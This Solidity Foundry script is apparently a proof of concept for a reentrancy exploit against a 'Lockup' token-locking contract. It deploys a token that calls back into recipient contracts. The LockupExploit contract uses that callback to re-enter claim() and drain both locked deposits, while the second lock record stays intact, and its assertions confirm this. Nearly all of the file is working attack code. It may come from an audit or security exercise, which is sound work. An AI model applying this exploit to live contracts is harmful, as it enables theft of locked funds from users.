// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import { Script, console } from "forge-std/Script.sol";
import { Lockup } from "../src/Lockup.sol";
import { LockupDeployer } from "./LockupDeployer.s.sol";
import { ERC20 } from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import { ERC1967Proxy } from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";

interface ICallbackRecipient {
    function ERC20Callback(address from, uint256 value) external;
}

contract CallbackToken is ERC20 {
    constructor(string memory name_, string memory symbol_) ERC20(name_, symbol_) {
        _mint(msg.sender, 100 ether);
    }

    function _update(address from, address to, uint256 value) internal override {
        super._update(from, to, value);
        
        if (to.code.length != 0) {
            try ICallbackRecipient(to).ERC20Callback(from, value) {
                // ...
            } catch {
                // ...
            }
        }

    }
}

contract LockupExploit is LockupDeployer {

    Lockup lockup;

    function runExploit(address lockupAddr) public {

        if (lockupAddr == address(0)) {
            // Assume that `lockupAddr == 0` means the lockup needs to be deployed
            deploy();
            lockup = deployedLockup;
        } else {
            lockup = Lockup(lockupAddr);
        }

        IERC20 callbackToken = new CallbackToken("CallbackToken", "CallbackToken");
        callbackToken.approve(address(lockup), type(uint256).max);
        lockup.lockup(callbackToken, address(this), 10 ether);
        lockup.lockup(callbackToken, address(this), 10 ether);

        vm.warp(block.timestamp + lockup.LOCKUP_PERIOD() + 1);

        assert(callbackToken.balanceOf(address(lockup)) == 20 ether);

        uint256[] memory ids = new uint256[](1);
        ids[0] = 1;
        lockup.claim(ids);

        assert(callbackToken.balanceOf(address(lockup)) == 0 ether);

        (,,, uint256 amount) = lockup.lockups(2);

        assert(amount != 0);
    }

    bool alreadyCalled;
    function ERC20Callback(address from, uint256 value) external {
        if (alreadyCalled) return;
        alreadyCalled = true;

        uint256[] memory ids = new uint256[](1);
        ids[0] = 1;
        lockup.claim(ids);
    }
}